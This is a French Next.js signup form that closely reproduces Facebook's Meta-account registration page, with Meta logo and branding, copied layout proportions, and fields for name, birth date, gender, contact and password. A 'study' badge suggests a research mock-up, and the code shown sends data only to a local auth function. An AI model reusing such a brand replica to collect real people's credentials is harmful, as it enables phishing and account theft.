"use client";

import {
  useEffect,
  useLayoutEffect,
  useRef,
  useState,
  type CSSProperties,
  type KeyboardEvent,
  type ReactNode,
} from "react";
import { useRouter } from "next/navigation";
import { ChevronDown, ChevronLeft } from "lucide-react";
import { isEmail, isPhone, registerUser } from "@/lib/auth";
import { loadItem, saveItem } from "@/lib/db";
import { Figtree } from "next/font/google";

// Police proche de celle de Facebook (la vraie n'est pas distribuée librement)
const fbFont = Figtree({ subsets: ["latin"], weight: ["400", "500", "600", "700"] });

// Proportions mesurées sur la page de référence (tout est relatif à la largeur du formulaire)
const TEXT = "max(13px, 2.6cqw)";

const fieldClass =
  "w-full border border-[#CED0D4] bg-white text-[#1C1E21] placeholder:text-[#65676B] outline-none focus:border-[#0064E0] focus:ring-1 focus:ring-[#0064E0]";
const fieldStyle: CSSProperties = {
  height: "max(48px, 10.5cqw)",
  fontSize: TEXT,
  paddingInline: "max(12px, 3cqw)",
  borderRadius: "3.6cqw",
};
const pillStyle: CSSProperties = {
  height: "max(46px, 8.6cqw)",
  fontSize: TEXT,
  borderRadius: "999px",
};
const paragraphStyle: CSSProperties = { fontSize: TEXT, lineHeight: 1.29 };

// Année fixe : Next.js (Cache Components) refuse new Date() pendant le rendu
const THIS_YEAR = 2026;

type Option = { value: string; label: string };

const MONTHS = [
  "janvier", "février", "mars", "avril", "mai", "juin",
  "juillet", "août", "septembre", "octobre", "novembre", "décembre",
];

const DAY_OPTIONS: Option[] = Array.from({ length: 31 }, (_, i) => ({
  value: String(i + 1),
  label: String(i + 1),
}));
const MONTH_OPTIONS: Option[] = MONTHS.map((m, i) => ({ value: String(i + 1), label: m }));
const YEAR_OPTIONS: Option[] = Array.from({ length: 111 }, (_, i) => ({
  value: String(THIS_YEAR - i),
  label: String(THIS_YEAR - i),
}));
const GENDER_OPTIONS: Option[] = [
  { value: "femme", label: "Féminin" },
  { value: "homme", label: "Masculin" },
  { value: "autre", label: "Personnalisé" },
];
const PRONOUN_OPTIONS: Option[] = [
  { value: "elle", label: "Elle : « Souhaitez-lui un bon anniversaire ! »" },
  { value: "il", label: "Il : « Souhaitez-lui un bon anniversaire ! »" },
  { value: "ils", label: "Ils : « Souhaitez-leur un bon anniversaire ! »" },
];

// Vrai s'il y a au moins un signe : ni lettre (accentuée ou non), ni chiffre, ni espace
const hasSymbol = (value: string) => /[^A-Za-z0-9À-ÿ\s]/.test(value);

const FOOTER_LANGS = [
  "Français (France)", "English (US)", "العربية", "Español",
  "Deutsch", "עברית", "Italiano", "Autres langues...",
];

const FOOTER_LINK_ROWS: string[][] = [
  [
    "S’inscrire", "Se connecter", "Messenger", "Facebook Lite", "Vidéo", "Meta Pay",
    "Boutique Meta", "Meta Quest", "Ray-Ban Meta", "Meta AI", "Muse", "Instagram", "Threads",
  ],
  [
    "Politique de confidentialité", "Centre de confidentialité", "À propos",
    "Créer une publicité", "Créer une Page", "Développeurs", "Emplois", "Cookies",
    "Choisir sa publicité",
  ],
  ["Conditions générales", "Aide", "Importation des contacts et non-utilisateurs"],
];

type Draft = {
  firstName: string;
  lastName: string;
  day: string;
  month: string;
  year: string;
  gender: string;
  identifier: string;
  pronoun: string;
  customGender: string;
};

function HelpIcon() {
  return (
    <svg
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.8"
      strokeLinecap="round"
      strokeLinejoin="round"
      aria-hidden="true"
      style={{
        width: "max(16px, 3.7cqw)",
        height: "max(16px, 3.7cqw)",
        marginLeft: "1.2cqw",
      }}
    >
      <circle cx="12" cy="12" r="10" />
      <path d="M9.1 9a3 3 0 0 1 5.8 1c0 2-3 3-3 3" />
      <path d="M12 17h.01" />
    </svg>
  );
}

function Label({
  children,
  help,
  top,
}: {
  children: ReactNode;
  help?: boolean;
  top?: string;
}) {
  return (
    <div
      className="flex items-center font-semibold"
      style={{
        fontSize: "max(15px, 3cqw)",
        lineHeight: 1.3,
        marginTop: top,
        marginBottom: help ? "2.4cqw" : "1.4cqw",
      }}
    >
      {children}
      {help && <HelpIcon />}
    </div>
  );
}

// Liste déroulante personnalisée : libellé flottant + menu arrondi avec ombre.
// Le menu s'ouvre vers le haut quand il n'y a pas assez de place en bas de l'écran.
function Select({
  value,
  onChange,
  placeholder,
  floatLabel,
  options,
}: {
  value: string;
  onChange: (v: string) => void;
  placeholder: string;
  floatLabel: string;
  options: Option[];
}) {
  const [open, setOpen] = useState(false);
  const [active, setActive] = useState(0);
  const [up, setUp] = useState(false);
  const [maxH, setMaxH] = useState<number | undefined>(undefined);
  const boxRef = useRef<HTMLDivElement>(null);
  const listRef = useRef<HTMLUListElement>(null);
  const selected = options.find((o) => o.value === value);

  // Fermer en cliquant ailleurs
  useEffect(() => {
    if (!open) return;
    function onDown(e: MouseEvent) {
      if (boxRef.current && !boxRef.current.contains(e.target as Node)) setOpen(false);
    }
    document.addEventListener("mousedown", onDown);
    return () => document.removeEventListener("mousedown", onDown);
  }, [open]);

  // Mesurer la place disponible avant l'affichage : en bas si possible, sinon en haut
  useLayoutEffect(() => {
    if (!open) return;
    const box = boxRef.current;
    const list = listRef.current;
    if (!box || !list) return;
    const rect = box.getBoundingClientRect();
    const below = window.innerHeight - rect.bottom - 12;
    const above = rect.top - 12;
    const height = list.offsetHeight;
    if (height > below && above > below) {
      setUp(true);
      setMaxH(Math.min(height, above));
    } else if (height > below) {
      setMaxH(below);
    }
  }, [open]);

  // Garder la ligne active visible
  useEffect(() => {
    if (!open) return;
    const el = listRef.current?.children[active] as HTMLElement | undefined;
    el?.scrollIntoView({ block: "nearest" });
  }, [open, active]);

  function openList() {
    const i = options.findIndex((o) => o.value === value);
    setActive(i >= 0 ? i : 0);
    setUp(false);
    setMaxH(undefined);
    setOpen(true);
  }

  function choose(i: number) {
    onChange(options[i].value);
    setOpen(false);
  }

  function onKeyDown(e: KeyboardEvent<HTMLButtonElement>) {
    if (!open) {
      if (e.key === "ArrowDown" || e.key === "ArrowUp" || e.key === "Enter" || e.key === " ") {
        e.preventDefault();
        openList();
      }
      return;
    }
    if (e.key === "ArrowDown") {
      e.preventDefault();
      setActive((i) => Math.min(options.length - 1, i + 1));
    } else if (e.key === "ArrowUp") {
      e.preventDefault();
      setActive((i) => Math.max(0, i - 1));
    } else if (e.key === "Enter" || e.key === " ") {
      e.preventDefault();
      choose(active);
    } else if (e.key === "Escape" || e.key === "Tab") {
      setOpen(false);
    }
  }

  return (
    <div ref={boxRef} className="relative w-full">
      <button
        type="button"
        role="combobox"
        aria-haspopup="listbox"
        aria-expanded={open}
        aria-label={floatLabel}
        onClick={() => (open ? setOpen(false) : openList())}
        onKeyDown={onKeyDown}
        className={`flex w-full cursor-pointer items-center justify-between border bg-white text-left text-[#1C1E21] outline-none ${
          open
            ? "border-[#1C1E21] ring-2 ring-[#0A78FF]"
            : "border-[#CED0D4] focus-visible:border-[#0064E0] focus-visible:ring-1 focus-visible:ring-[#0064E0]"
        }`}
        style={fieldStyle}
      >
        <span className="flex min-w-0 flex-col justify-center">
          {selected ? (
            <>
              <span
                className="font-medium text-[#65676B]"
                style={{ fontSize: "max(11px, 2.1cqw)", lineHeight: 1.2 }}
              >
                {floatLabel}
              </span>
              <span className="truncate" style={{ lineHeight: 1.25 }}>
                {selected.label}
              </span>
            </>
          ) : (
            <span className="truncate font-medium text-[#65676B]">{placeholder}</span>
          )}
        </span>
        <ChevronDown
          strokeWidth={2.2}
          className="shrink-0"
          style={{ width: "max(16px, 3.4cqw)", height: "max(16px, 3.4cqw)" }}
        />
      </button>

      {open && (
        <ul
          ref={listRef}
          role="listbox"
          className="absolute left-0 right-0 z-30 overflow-y-auto bg-white [&::-webkit-scrollbar]:w-3 [&::-webkit-scrollbar-track]:bg-[rgba(140,140,150,0.2)] [&::-webkit-scrollbar-thumb]:rounded-full [&::-webkit-scrollbar-thumb]:border-2 [&::-webkit-scrollbar-thumb]:border-transparent [&::-webkit-scrollbar-thumb]:bg-[rgba(110,112,120,0.7)] [&::-webkit-scrollbar-thumb]:bg-clip-padding [&::-webkit-scrollbar-button]:hidden"
          style={{
            ...(up
              ? { bottom: "calc(100% + 0.5cqw)" }
              : { top: "calc(100% + 0.5cqw)" }),
            maxHeight: maxH !== undefined ? `${maxH}px` : "max(300px, 60cqw)",
            borderRadius: "3.4cqw",
            boxShadow: "0 4px 24px rgba(0,0,0,0.22)",
          }}
        >
          {options.map((o, i) => {
            const isSelected = o.value === value;
            const isActive = i === active;
            return (
              <li
                key={o.value}
                role="option"
                aria-selected={isSelected}
                onMouseEnter={() => setActive(i)}
                onClick={() => choose(i)}
                className={`flex cursor-pointer items-center ${
                  isSelected
                    ? "bg-[#3F4042] font-medium text-white"
                    : isActive
                      ? "bg-[#F0F0F0] text-[#1C1E21]"
                      : "text-[#1C1E21]"
                }`}
                style={{
                  height: "max(44px, 9.4cqw)",
                  paddingInline: "3cqw",
                  fontSize: TEXT,
                }}
              >
                {o.label}
              </li>
            );
          })}
        </ul>
      )}
    </div>
  );
}

export default function SignupForm() {
  const router = useRouter();
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [day, setDay] = useState("");
  const [month, setMonth] = useState("");
  const [year, setYear] = useState("");
  const [gender, setGender] = useState("");
  const [pronoun, setPronoun] = useState("");
  const [customGender, setCustomGender] = useState("");
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [busy, setBusy] = useState(false);
  const [draftLoaded, setDraftLoaded] = useState(false);

  // Au chargement : on remet ce qui avait été saisi (jamais le mot de passe)
  useEffect(() => {
    loadItem<Draft | null>("signup-draft")
      .then((d) => {
        if (!d) return;
        setFirstName(d.firstName ?? "");
        setLastName(d.lastName ?? "");
        setDay(d.day ?? "");
        setMonth(d.month ?? "");
        setYear(d.year ?? "");
        setGender(d.gender ?? "");
        setPronoun(d.pronoun ?? "");
        setCustomGender(d.customGender ?? "");
        setIdentifier(d.identifier ?? "");
      })
      .catch((e) => console.error("Brouillon illisible :", e))
      .finally(() => setDraftLoaded(true));
  }, []);

  // À chaque changement : on enregistre le brouillon
  useEffect(() => {
    if (!draftLoaded) return;
    const draft: Draft = {
      firstName, lastName, day, month, year, gender, identifier, pronoun, customGender,
    };
    saveItem("signup-draft", draft).catch((e) =>
      console.error("Brouillon non enregistré :", e)
    );
  }, [draftLoaded, firstName, lastName, day, month, year, gender, identifier, pronoun, customGender]);

  function handleGender(v: string) {
    setGender(v);
    if (v !== "autre") {
      setPronoun("");
      setCustomGender("");
    }
  }

  async function handleSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    setError("");

    if (!firstName.trim() || !lastName.trim() || !identifier.trim() || !password) {
      setError("Remplis tous les champs.");
      return;
    }
    if (!day || !month || !year) {
      setError("Choisis ta date de naissance.");
      return;
    }
    if (!gender) {
      setError("Sélectionne ton genre.");
      return;
    }
    if (gender === "autre" && !pronoun) {
      setError("Sélectionne ton pronom.");
      return;
    }
    const value = identifier.trim();
    if (value.includes("@") ? !isEmail(value) : !isPhone(value)) {
      setError(
        value.includes("@")
          ? "Entre une adresse e-mail valide."
          : "Entre un numéro de mobile valide (8 chiffres minimum) ou une adresse e-mail."
      );
      return;
    }
    if (password.length < 6) {
      setError("Le mot de passe doit contenir au moins 6 caractères.");
      return;
    }
    if (!hasSymbol(password)) {
      setError("Le mot de passe doit contenir au moins un signe (par exemple ! @ # &).");
      return;
    }

    setBusy(true);
    try {
      const result = await registerUser({ firstName, lastName, identifier, password });
      if (!result.ok) {
        setError(result.error ?? "Inscription impossible.");
        setBusy(false);
        return;
      }
      await saveItem("signup-draft", null).catch(() => {}); // le brouillon n'est plus utile
      router.push("/bienvenue"); // la personne est connectée directement
    } catch (err) {
      setError(err instanceof Error ? err.message : "Une erreur est survenue. Réessaie.");
      setBusy(false);
    }
  }

  return (
    <div
      className="min-h-screen bg-white px-5 text-[#1C1E21]"
      style={{ fontFamily: `${fbFont.style.fontFamily}, Arial, Helvetica, sans-serif` }}
    >
      <div
        className="mx-auto w-full max-w-[536px]"
        style={{ containerType: "inline-size" }}
      >
        <div style={{ paddingTop: "8cqw", paddingBottom: "8cqw" }}>
          {/* Flèche retour */}
          <a href="/" aria-label="Retour" className="inline-block cursor-pointer">
            <ChevronLeft
              strokeWidth={1.8}
              style={{ width: "max(20px, 3.9cqw)", height: "max(20px, 3.9cqw)" }}
            />
          </a>

          {/* Logo Meta + étiquette study */}
          <div className="flex items-center" style={{ marginTop: "2.4cqw", gap: "2cqw" }}>
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img
              src="/meta-logo.png"
              alt="Meta"
              className="mix-blend-multiply"
              style={{ height: "max(35px, 3.1cqw)", width: "auto" }}
            />
            <span
              className="rounded-md bg-[#E7F3FF] font-bold uppercase tracking-wide text-[#0064E0]"
              style={{ fontSize: "max(11px, 2.2cqw)", padding: "0.4cqw 1.6cqw" }}
            >
              study
            </span>
          </div>

          {/* Titre */}
          <h1
            className="font-semibold"
            style={{
              marginTop: "2.8cqw",
              fontSize: "max(20px, 4.5cqw)",
              lineHeight: 1.12,
            }}
          >
            Démarrez sur Facebook à l’aide d’un compte Meta
          </h1>
          <p style={{ ...paragraphStyle, marginTop: "1cqw" }}>
            Un Compte Meta vous permet d’accéder facilement et en toute sécurité à plusieurs
            technologies Meta, comme Facebook.
          </p>

          <form onSubmit={handleSubmit} style={{ marginTop: "3cqw" }}>
            <Label>Nom</Label>
            <div className="flex" style={{ gap: "2.2cqw" }}>
              <input
                value={firstName}
                onChange={(e) => setFirstName(e.target.value)}
                placeholder="Prénom"
                autoComplete="given-name"
                className={fieldClass}
                style={fieldStyle}
              />
              <input
                value={lastName}
                onChange={(e) => setLastName(e.target.value)}
                placeholder="Nom"
                autoComplete="family-name"
                className={fieldClass}
                style={fieldStyle}
              />
            </div>

            <Label help top="4.7cqw">
              Date de naissance
            </Label>
            <div className="flex" style={{ gap: "3cqw" }}>
              <Select
                value={day}
                onChange={setDay}
                placeholder="Jour"
                floatLabel="Jour"
                options={DAY_OPTIONS}
              />
              <Select
                value={month}
                onChange={setMonth}
                placeholder="Mois"
                floatLabel="Mois"
                options={MONTH_OPTIONS}
              />
              <Select
                value={year}
                onChange={setYear}
                placeholder="Année"
                floatLabel="Année"
                options={YEAR_OPTIONS}
              />
            </div>

            <Label help top="4.7cqw">
              Genre
            </Label>
            <Select
              value={gender}
              onChange={handleGender}
              placeholder="Sélectionnez votre genre"
              floatLabel="Sélectionnez votre genre"
              options={GENDER_OPTIONS}
            />

            {gender === "autre" && (
              <>
                <div style={{ marginTop: "2.3cqw" }}>
                  <Select
                    value={pronoun}
                    onChange={setPronoun}
                    placeholder="Sélectionnez votre pronom"
                    floatLabel="Sélectionnez votre pronom"
                    options={PRONOUN_OPTIONS}
                  />
                </div>
                <p style={{ ...paragraphStyle, marginTop: "2.2cqw" }}>
                  Votre pronom est visible par tout le monde.
                </p>
                <input
                  value={customGender}
                  onChange={(e) => setCustomGender(e.target.value)}
                  placeholder="Genre (facultatif)"
                  className={fieldClass}
                  style={{ ...fieldStyle, marginTop: "2.2cqw" }}
                />
              </>
            )}

            <Label top="3.7cqw">Numéro de mobile ou adresse e-mail</Label>
            <input
              type="text"
              value={identifier}
              onChange={(e) => setIdentifier(e.target.value)}
              placeholder="Numéro de mobile ou adresse e-mail"
              autoComplete="username"
              className={fieldClass}
              style={fieldStyle}
            />
            <p style={{ ...paragraphStyle, marginTop: "2.2cqw" }}>
              Vous pouvez être amené(e) à recevoir des notifications de notre part.{" "}
              <span className="font-semibold text-[#0064E0]">
                Découvrez pourquoi nous vous demandons vos coordonnées
              </span>
            </p>

            <Label top="2.8cqw">Mot de passe</Label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Mot de passe"
              autoComplete="new-password"
              className={fieldClass}
              style={fieldStyle}
            />

            <p style={{ ...paragraphStyle, marginTop: "5.8cqw" }}>
              Il se pourrait que des personnes utilisant notre service aient importé vos
              coordonnées sur Facebook.{" "}
              <span className="font-semibold text-[#0064E0]">En savoir plus.</span>
            </p>
            <p style={{ ...paragraphStyle, marginTop: "2cqw" }}>
              En appuyant sur Envoyer, vous consentez à la création d’un compte et acceptez les{" "}
              <span className="font-semibold text-[#0064E0]">Conditions générales</span>, la{" "}
              <span className="font-semibold text-[#0064E0]">Politique de confidentialité</span>{" "}
              et la{" "}
              <span className="font-semibold text-[#0064E0]">
                Politique d’utilisation des cookies
              </span>{" "}
              de Facebook.
            </p>
            <p style={{ ...paragraphStyle, marginTop: "2cqw" }}>
              La <span className="font-semibold text-[#0064E0]">Politique de confidentialité</span>{" "}
              décrit les différentes manières dont nous pouvons utiliser les informations que nous
              recueillons lorsque vous créez un compte. Nous utilisons par exemple ces informations
              pour fournir, personnaliser et améliorer nos produits, y compris les publicités.
            </p>

            {error && (
              <p className="text-[#E41E3F]" style={{ ...paragraphStyle, marginTop: "3cqw" }}>
                {error}
              </p>
            )}

            <button
              type="submit"
              disabled={busy}
              className="w-full cursor-pointer bg-[#0064E0] font-medium text-white hover:bg-[#0A72F0] disabled:opacity-70"
              style={{ ...pillStyle, marginTop: "5cqw" }}
            >
              {busy ? "Création..." : "Envoyer"}
            </button>

            <a
              href="/"
              className="flex w-full cursor-pointer items-center justify-center bg-[#F2F3F5] font-medium text-[#1C1E21] hover:bg-[#E4E6EB]"
              style={{ ...pillStyle, marginTop: "2.2cqw" }}
            >
              J’ai déjà un compte
            </a>
          </form>
        </div>
      </div>

      {/* Pied de page */}
      <footer
        className="pb-10 text-[#65676B] lg:px-[13%]"
        style={{ fontSize: "clamp(13px, 1.05vw, 18px)" }}
      >
        <div className="flex flex-wrap gap-x-10 gap-y-2">
          {FOOTER_LANGS.map((l) => (
            <span key={l} className="cursor-pointer hover:underline">
              {l}
            </span>
          ))}
        </div>
        {FOOTER_LINK_ROWS.map((row, i) => (
          <div key={i} className="mt-4 flex flex-wrap gap-x-4 gap-y-2">
            {row.map((l) => (
              <span key={l} className="cursor-pointer hover:underline">
                {l}
              </span>
            ))}
          </div>
        ))}
      </footer>
    </div>
  );
}